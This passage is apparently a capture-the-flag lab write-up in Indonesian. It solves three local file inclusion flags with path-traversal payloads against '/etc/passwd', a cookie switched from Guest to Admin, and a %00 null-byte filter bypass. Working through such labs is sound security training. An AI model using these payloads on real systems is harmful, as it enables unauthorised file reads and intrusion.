@@ -1,0 +1,46 @@
+POST method broken, jadi gunakan burpsuite.
+
+intercept on.
+
+isi file apapun.
+
+# flag1:
+isi file apapun
+```
+file=welcome.php
+```
+
+lalu ubah request method dari GET ke POST dengan cara
+```
+klik kanan
+pilih change request method
+```
+
+selanjutnya edit isi file
+```
+file=../../../../etc/passwd
+```
+
+# flag2:
+page ini hanya tersedia untuk admin. perhatikan cookie,
+ubah cookie dari `Guest` ke `Admin`, ternyata bisa.
+selanjutnya coba ganti value cookie menjadi file dengan cara
+```
+Cookie THM=../../../../etc/passwd
+```
+
+# flag3:
+kita dapat coba isi file dengan `welcome.php`
+hasilnyat terdapat error
+```
+Warning: include(welcome.php .php)...
+```
+yang mana artinya terdapat filter keyword, untuk dapat mengatasinya
+kita ubah dari GET ke POST, lalu gunakan `%00`
+```
+file=welcome.php%00
+```
+hasilnya akan berhasil, selanjutnya kita dapat mengisinya dengan
+```
+file=../../../../etc/flag3%00
+```
